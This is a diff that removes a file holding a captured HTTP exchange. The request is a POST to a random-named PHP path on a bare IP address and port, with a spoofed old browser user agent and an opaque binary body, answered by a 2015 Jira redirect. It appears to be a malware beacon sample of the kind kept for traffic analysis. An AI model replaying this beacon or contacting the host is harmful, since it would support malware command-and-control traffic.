@@ -1,16 +1,0 @@
-POST /83736aa6/806782973.php HTTP/1.1
-Accept: */*
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)
-Host: 64.207.134.54:8080
-Content-Length: 197
-Connection: Keep-Alive
-Cache-Control: no-cache
-
-JÌÕj7ìA,»pöÜöºûÄÙ]­z›1µö—Áé1L±ß®!³-A[ö«ÑıÎ…›¬¿” N&¸)ƒXx0!¢L7´+1“Eúš°v(Ú:Jq’d0ªËk»Ì°frÉƒè!^UpX{Ñ€51OTíÊÓx?$ğÄÃ	£Ö©•Ï]º_wŸIçb¬¼ÉVx/h×¤)pü†÷+¸uUàPšN]æŒg×ÌDr›¢Vé9§ó±ƒ™„†¼Æi8HTTP/1.1 302 Moved Temporarily
-Server: Apache-Coyote/1.1
-X-AREQUESTID: 436x620834x1
-Location: http://JiraLockedError
-Content-Length: 0
-Date: Thu, 23 Apr 2015 11:16:45 GMT
-Connection: close
-
